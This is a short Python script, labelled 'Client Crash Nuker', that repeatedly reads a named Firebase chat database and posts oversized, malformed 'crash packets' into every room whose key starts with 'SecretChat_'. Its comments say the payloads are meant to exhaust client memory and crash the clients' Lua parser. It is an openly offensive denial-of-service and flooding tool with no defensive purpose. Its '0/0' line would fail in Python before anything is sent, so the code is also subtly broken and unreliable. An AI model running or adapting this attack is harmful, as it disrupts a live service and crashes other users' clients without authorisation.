import time
import requests

database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] Client Crash Nuker Initialized...")

session = requests.Session()

while True:
    try:
        root_response = session.get(f"{database_url}/.json", timeout=5)
        
        if root_response.status_code == 200:
            data = root_response.json()
            if isinstance(data, dict):
                for key in data.keys():
                    if key.startswith("SecretChat_"):
                        room_url = f"{database_url}/{key}.json"
                        
                        # Malformed payload with massive nested structures to crash the Lua parser
                        crash_payload = {
                            "Sender": "CRASH_NULL_POINTER_EXCEPTION",
                            "Message": "A" * 500000, # Massive string to exhaust client memory instantly
                            "Timestamp": 0/0, # Forces a math error or nil conversion crash if parsed
                            "Aura": "INVALID_CRASH_AURA",
                            "Color": "red"
                        }
                        
                        session.post(room_url, json=crash_payload, headers=headers, timeout=1)
                        print(f"[FORBID] Crash packet deployed to: {key}")
        
    except Exception as e:
        print(f"[FORBID] Error: {e}")
        
    time.sleep(0.05)
